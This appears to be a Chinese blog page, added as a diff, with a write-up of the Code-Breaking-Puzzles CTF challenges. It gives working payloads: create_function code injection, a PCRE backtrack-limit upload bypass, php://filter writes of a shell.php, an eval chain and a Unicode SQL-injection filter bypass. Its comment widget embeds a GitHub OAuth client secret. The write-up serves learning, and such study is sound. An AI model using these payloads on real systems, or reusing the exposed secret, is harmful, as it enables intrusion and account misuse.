@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            Code-Breaking-Puzzles WriteUp
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/12/21/Code-Breaking-Puzzles WriteUp/"> 
+                    Code-Breaking-Puzzles WriteUp 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-12-21   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Code-Breaking-Puzzles-WriteUp"><span class="toc-list-text">Code-Breaking-Puzzles WriteUp</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#easy-function"><span class="toc-list-text">easy - function</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#easy-pcrewaf"><span class="toc-list-text">easy - pcrewaf</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#逻辑"><span class="toc-list-text">逻辑</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#PCRE"><span class="toc-list-text">PCRE</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#分析"><span class="toc-list-text">分析</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#POC"><span class="toc-list-text">POC</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#phpmagic"><span class="toc-list-text">phpmagic</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#php-filter"><span class="toc-list-text">php://filter</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#审计"><span class="toc-list-text">审计</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#php-limit"><span class="toc-list-text">php limit</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Nodejs魔法"><span class="toc-list-text">Nodejs魔法</span></a></li></ol>
+</div>
+            <div class="content">
+                <h1 id="Code-Breaking-Puzzles-WriteUp"><a href="#Code-Breaking-Puzzles-WriteUp" class="headerlink" title="Code-Breaking-Puzzles WriteUp"></a>Code-Breaking-Puzzles WriteUp</h1><p>最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。</p>
+<h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><p>不得不说P神的代码简洁又暴力</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p>
+<p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p>
+<p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似</p>
+<p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p>
+<p>直接上Poc:<br><code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));//</code></p>
+<p>别忘了注释//，否则逃脱不了函数</p>
+<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($_FILES)) &#123;</span><br><span class="line">    die(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">$data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if (is_php($data)) &#123;</span><br><span class="line">    echo &quot;bad request&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @mkdir($user_dir, 0755);</span><br><span class="line">    $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path);</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: $path&quot;, true, 303);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p>
+<p>很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？</p>
+<h2 id="PCRE"><a href="#PCRE" class="headerlink" title="PCRE"></a>PCRE</h2><p>PCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库</p>
+<p>NFA引擎</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data)</span><br></pre></td></tr></table></figure>
+
+<p>如果我们输入<code>&lt;?php print;abcd</code></p>
+<p>那么它匹配的流程应该是这样的：<br><code>&lt;?php print;abc</code><br><code>&lt;?php print;ab</code><br><code>&lt;?php print;a</code><br><code>&lt;?php print;</code><br><code>&lt;?php print;abcd</code></p>
+<p><strong>.*</strong>会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制</p>
+<p>引用kk师傅的一张图：<br><img src="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/3.png" alt></p>
+<p>5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>既然是弱类型比较，我们就用false来等价null绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);</span><br><span class="line">$msg = &quot;&lt;?php print_r(scandir(&apos;../&apos;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);</span><br><span class="line">fwrite($f,$msg);</span><br><span class="line">fclose($f);</span><br></pre></td></tr></table></figure>
+
+<p>构造个上传表单完事</p>
+<p>这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素</p>
+<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>这个题真的发现很多知识碎片</p>
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic</p>
+<p>当我们可控的文件名$file传入参数<code>php://filter/write=convert.base64-decode/resource=shell.php</code>，$text传入<code>this is test</code>时，file_put_contents($file,$text)执行的内容如下：<br><img src="https://s1.ax1x.com/2018/12/24/F6Hv60.png" alt></p>
+<p>可以把写入的文本进行base64编码，而且可以指定写入的文件名<code>shell.php</code>。其实这个用处还挺多的，比如将可控文本Base64编码，用伪协议写入文件的时候再decode，就能绕过<strong>后端正则对可控文本php危险语句检测</strong>的过滤</p>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>关键代码<br><img src="https://s1.ax1x.com/2018/12/24/F6bp0U.png" alt></p>
+<p>$output会被转义后输入到可控文本，用上面的思路在写入文本的时候base64-decode就能绕过，注意用Host拼接$log_name。</p>
+<p>至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a><br><img src="https://s1.ax1x.com/2018/12/24/F6bE11.png" alt></p>
+<p>poc如下<br><img src="https://s1.ax1x.com/2018/12/24/F6b97F.png" alt></p>
+<h1 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h1><p>这道题依然简单粗暴，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p>
+<p>在匹配完b()之后，由于匹配不到[^\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值</p>
+<p>有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下</p>
+<p><img src="https://i.loli.net/2019/01/08/5c3413c0a9be1.png" alt></p>
+<h1 id="Nodejs魔法"><a href="#Nodejs魔法" class="headerlink" title="Nodejs魔法"></a>Nodejs魔法</h1><p>Koa框架写的登陆页面，入库的语句都写出来了<br><img src="https://i.loli.net/2018/12/02/5c033d7cc5c7a.png" alt></p>
+<p>看到这一步很关键，因为忘了看flag在哪个表里，后面浪费了很多时间</p>
+<p>继续看到登陆的逻辑<br><img src="https://i.loli.net/2018/12/02/5c033d7ce1b2e.png" alt><br>传入的username&amp;&amp;password非空，并且经过safe函数过滤后带入查询，如果有结果则设定session为查询结果</p>
+<p>##分析<br>一开始绕safe就饶了好久,尝试了各种注释。最后l0cal师傅提醒，在js里toUpperCase()是可以用拉丁文的unicode绕过的，例如<code>&quot;ſ&quot;.toUpperCase()&lt;=&gt;&quot;S&quot;</code>和<code>&quot;ı&quot;.toUpperCase()&lt;=&gt;&quot;I&quot;</code></p>
+<p>那么select 和 union 都可以绕过</p>
+<p>一开始想多了,一直在盲注,根据时候有session判断查询的真假，结果好多东西都绕不过去，而且没看代码还在傻乎乎的测表名，十分愚蠢</p>
+<p>有好多语句都会500，估计是云服务做了限制。。到最后发现把用户名和密码置空，后面用union查询flag，那设置的session不就是flag么。。</p>
+<p>真的是太菜了</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2018/12/21/Code-Breaking-Puzzles WriteUp/">https://hpdoger.cn/2018/12/21/Code-Breaking-Puzzles WriteUp/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">  从两道CTF题目学习XXE漏洞</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2018/12/20/SWPUCTF2018 Write up/"> SWPUCTF2018 Write up </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Fri Dec 21 2018 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
